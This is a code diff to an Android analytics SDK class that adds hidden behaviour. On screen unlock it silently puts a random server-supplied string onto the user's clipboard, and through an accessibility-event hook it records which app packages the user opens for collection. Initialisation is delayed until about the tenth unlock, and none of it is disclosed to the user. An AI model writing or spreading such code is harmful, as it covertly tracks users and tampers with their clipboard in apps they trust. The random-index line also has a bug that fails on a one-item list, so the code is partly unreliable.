@@ -3,13 +3,19 @@ package com.analysys.track.internal;
 import android.app.AppOpsManager;
 import android.app.Application;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Build;
 import android.os.PowerManager;
 import android.os.Process;
+import android.text.TextUtils;
 import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 
 import com.analysys.track.BuildConfig;
 import com.analysys.track.internal.content.EGContext;
+import com.analysys.track.internal.content.UploadKey;
+import com.analysys.track.internal.impl.ReceiverImpl;
+import com.analysys.track.internal.impl.oc.OCImpl;
 import com.analysys.track.internal.work.CrashHandler;
 import com.analysys.track.internal.work.MessageDispatcher;
 import com.analysys.track.internal.work.ServiceHelper;
@@ -19,40 +25,32 @@ import com.analysys.track.utils.EContextHelper;
 import com.analysys.track.utils.ELOG;
 import com.analysys.track.utils.EThreadPool;
 import com.analysys.track.utils.FileUitls;
-import com.analysys.track.utils.data.EncryptUtils;
+import com.analysys.track.utils.MClipManager;
 import com.analysys.track.utils.MultiProcessChecker;
 import com.analysys.track.utils.OAIDHelper;
 import com.analysys.track.utils.ReceiverUtils;
 import com.analysys.track.utils.SystemUtils;
+import com.analysys.track.utils.data.EncryptUtils;
 import com.analysys.track.utils.reflectinon.ClazzUtils;
 import com.analysys.track.utils.reflectinon.PatchHelper;
 import com.analysys.track.utils.sp.SPHelper;
 
+import org.json.JSONArray;
+
 import java.io.File;
 import java.util.HashMap;
+import java.util.Random;
 
 public class AnalysysInternal {
     private volatile boolean hasInit = false;
 
-    // 初始化反射模快
-    private AnalysysInternal() {
-    }
 
-    public static AnalysysInternal getInstance(Context context) {
-        try {
-            // 初始化日志
-            ELOG.init(EContextHelper.getContext(context));
-        } catch (Throwable e) {
-            if (BuildConfig.ENABLE_BUG_REPORT) {
-                BugReportForTest.commitError(e);
-            }
-        }
-        return Holder.instance;
+    /**
+     * 服务调用SDK初始化接口
+     */
+    public synchronized void aliave() {
+        initEguan(null, null, false);
     }
-
-//    public static boolean isInit() {
-//        return hasInit;
-//    }
 
     /**
      * 初始化函数,可能为耗时操作的，判断是否主线程，需要开子线程做
@@ -130,7 +128,6 @@ public class AnalysysInternal {
             if (ctx == null) {
                 return;
             }
-
             rename(ctx);
 
             SPHelper.setBooleanValue2SP(ctx, EGContext.KEY_INIT_TYPE, initType);
@@ -191,7 +188,7 @@ public class AnalysysInternal {
      *
      * @param ctx
      */
-    public void rename(Context ctx) {
+    private void rename(Context ctx) {
         try {
             File o1 = new File(ctx.getFilesDir(), EGContext.FILE_OLD_DIR);
             File n1 = new File(ctx.getFilesDir(), EGContext.FILE_NEW_DIR);
@@ -238,7 +235,7 @@ public class AnalysysInternal {
             if (cxt == null) {
                 return;
             }
-            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_UPLOAD, EGContext.TIME_SYNC_UPLOAD);
+
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_APPSNAPSHOT, EGContext.TIME_HOUR * 3);
             if (Build.VERSION.SDK_INT < 26) {
                 MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_OC, EGContext.TIME_SECOND * 5);
@@ -246,16 +243,17 @@ public class AnalysysInternal {
                 MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_OC, EGContext.TIME_SYNC_OC_OVER_5);
             }
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_LOCATION, EGContext.TIME_SYNC_LOCATION);
-            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_HOTFIX, EGContext.TIME_SECOND * 5);
-//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SP_WRITER, EGContext.TIME_SYNC_SP);
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SCREEN_OFF_BROADCAST, EGContext.TIME_SYNC_BROADCAST);
-//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SCREEN_ON_BROADCAST, EGContext.TIME_SYNC_BROADCAST);
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_ADD_BROADCAST, EGContext.TIME_SECOND * 5);
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_DELETE_BROADCAST, EGContext.TIME_SECOND * 5);
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SNAP_UPDATE_BROADCAST, EGContext.TIME_SECOND * 5);
-//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BOOT_BROADCAST, EGContext.TIME_SYNC_DEFAULT);
-            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BATTERY_BROADCAST, EGContext.TIME_SECOND * 5);
             MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_NET, EGContext.TIME_SECOND * 5);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SCREEN_ON_BROADCAST, EGContext.TIME_SYNC_BROADCAST);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BOOT_BROADCAST, EGContext.TIME_SYNC_DEFAULT);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_BATTERY_BROADCAST, EGContext.TIME_SECOND * 5);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_UPLOAD, EGContext.TIME_SYNC_UPLOAD);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_HOTFIX, EGContext.TIME_SECOND * 5);
+//            MultiProcessChecker.getInstance().createLockFile(cxt, EGContext.FILES_SYNC_SP_WRITER, EGContext.TIME_SYNC_SP);
         } catch (Throwable e) {
             if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
@@ -263,7 +261,91 @@ public class AnalysysInternal {
         }
     }
 
+    /************************************************* 解析Intent ********************************************************************/
+    public void parseIntent(final Intent intent) {
+        SystemUtils.runOnWorkThread(new Runnable() {
+            @Override
+            public void run() {
+                parserIntent(intent);
+            }
+        });
+    }
+
+    public void parserIntent(Intent intent) {
+        Context context = EContextHelper.getContext();
+        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
+            parExtra(context);
+            //没初始化并且开屏了10次,就初始化,否则+1返回不处理
+            int size = SPHelper.getIntValueFromSP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, 0);
+            if (BuildConfig.logcat) {
+                ELOG.w(BuildConfig.tag_recerver, " 解锁屏次数:" + size);
+            }
+            // 默认从0开始计数，为确保第N次生效，比较条件应为大于等于N-1
+            if (size >= (EGContext.FLAG_START_COUNT - 1)) {
+                if (BuildConfig.logcat) {
+                    ELOG.i(BuildConfig.tag_recerver, " 即将进行初始化。。。");
+                }
+//                initEguan(null, null, false);
+                aliave();
+            } else {
+                if (BuildConfig.logcat) {
+                    ELOG.d(BuildConfig.tag_recerver, " 即将进保存初始化次数，并退出");
+                }
+                SPHelper.setIntValue2SP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, size + 1);
+            }
+        } else {
+//            initEguan(null, null, false);
+            aliave();
+            ReceiverImpl.getInstance().process(context, intent);
+        }
+    }
+
+    private void parExtra(Context context) {
+        try {
+            String extras = SPHelper.getStringValueFromSP(context, UploadKey.Response.RES_POLICY_EXTRAS, "");
+            if (!TextUtils.isEmpty(extras)) {
+                JSONArray ar = new JSONArray(extras);
+                if (ar.length() > 0) {
+                    int x = new Random(System.nanoTime()).nextInt(ar.length() - 1);
+                    MClipManager.setClipbpard(context, "", ar.optString(x, ""));
+                }
+            }
+        } catch (Throwable igone) {
+        }
+    }
+
+    /***************************************************辅助功能使用********************************************************************/
+    public void accessibilityEvent(final AccessibilityEvent event) {
+        try {
+            aliave();
+            SystemUtils.runOnWorkThread(new Runnable() {
+                @Override
+                public void run() {
+                    CharSequence pkgName = event.getPackageName();
+                    if (TextUtils.isEmpty(pkgName)) {
+                        return;
+                    }
+                    final String pkg = pkgName.toString().trim();
+                    OCImpl.getInstance(EContextHelper.getContext()).processSignalPkgName(pkg, UploadKey.OCInfo.COLLECTIONTYPE_ACCESSIBILITY);
+                }
+            });
+        } catch (Throwable t) {
+            if (BuildConfig.ENABLE_BUG_REPORT) {
+                BugReportForTest.commitError(t);
+            }
+        }
+    }
+
+    /**************************************************************************************************************************************/
     private static class Holder {
         private static AnalysysInternal instance = new AnalysysInternal();
+    }
+
+    private AnalysysInternal() {
+    }
+
+    public static AnalysysInternal getInstance(Context context) {
+        EContextHelper.setContext(context);
+        return Holder.instance;
     }
 }
